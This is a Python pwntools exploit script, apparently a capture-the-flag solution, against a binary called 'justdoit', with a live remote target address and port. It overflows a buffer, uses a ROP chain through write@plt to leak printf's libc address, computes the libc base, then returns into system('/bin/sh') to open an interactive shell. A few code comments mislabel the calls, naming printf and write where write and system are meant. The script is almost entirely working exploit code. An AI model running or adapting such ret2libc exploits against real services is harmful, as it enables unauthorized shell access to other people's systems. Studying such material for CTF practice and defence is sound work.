from pwn import *
local = True


def getConn():
    return process('./justdoit', env={"LD_PRELOAD": './libc.so.6'}) if local else remote('163.172.176.29', 9036)


padding = 'aaaa' * 28
binary = ELF('./justdoit')
libc = ELF('libc.so.6')
WRITEPLT = binary.plt['write']
PRINTFGOT = binary.got['printf']
MAIN = 0x804847d  # You can get this from radare2 for example
ropchain = ''
ropchain += p32(WRITEPLT)  # PRINTF function "call"
ropchain += p32(MAIN)  # RETURN TO MAIN
ropchain += p32(0x1)  # STDIN ARG[0]
ropchain += p32(PRINTFGOT)  # PRINTF ADDRESS ARG[1]
ropchain += p32(0x4)  # BYTES TO READ ARG[2]
r = getConn()
gdb.attach(r, '''
	b *0x080484d8
	c''')
r.recvline()
r.sendline(padding + ropchain)
r.recv(len(padding) + len(ropchain))  # reads the printf output
PRINTF = u32(r.recv(0x4))
LIBCBASE = PRINTF - libc.symbols['printf']
SYSTEM = LIBCBASE + libc.symbols['system']
BINSH = LIBCBASE + 0x15900b
log.info("LIBC 0x%x" % LIBCBASE)
log.info("PRINTF 0x%x" % PRINTF)
log.info("SYSTEM 0x%x" % SYSTEM)
log.info("Binsh 0x%x" % BINSH)
ropchain2 = p32(SYSTEM)  # WRITE function "call"
ropchain2 += 'BBBB'  # Return address doesn't really matter to where we return after shell
ropchain2 += p32(BINSH)
r.recvuntil('Hello pwners, \n')
r.sendline('aaaa' * (28 - 2) + ropchain2)
r.recv()
r.interactive()
r.close()
